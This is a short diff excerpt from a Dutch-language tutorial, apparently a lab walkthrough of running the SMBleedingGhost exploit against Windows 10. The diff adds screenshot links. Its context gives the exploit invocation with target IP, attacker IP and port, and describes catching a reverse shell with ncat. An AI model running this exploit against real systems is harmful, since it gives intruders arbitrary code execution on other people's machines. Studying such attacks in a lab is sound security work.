@@ -108,3 +108,9 @@ Voor onze RCE uit te voeren moeten we dus eerst enkele dingen in orde hebben / u
 in ons geval zou onze code op zoiets lijken dus : `python3 SMBleedingGhost.py 192.168.1.17 192.168.1.20 1234`
 
 Na dit zal het eventjes duren en proberen om in de systeem te geraken, als alles goed gelukt is, zal in je ncat terminal waarop er geluisterd wordt veranderen naar een windows 10 shell waarbij je toegang hebt en willekeurige code kan uitvoeren.
+
+![alt text](images/image-2.png)
+
+![alt text](images/image-1.png)
+
+![alt text](images/image-3.png)
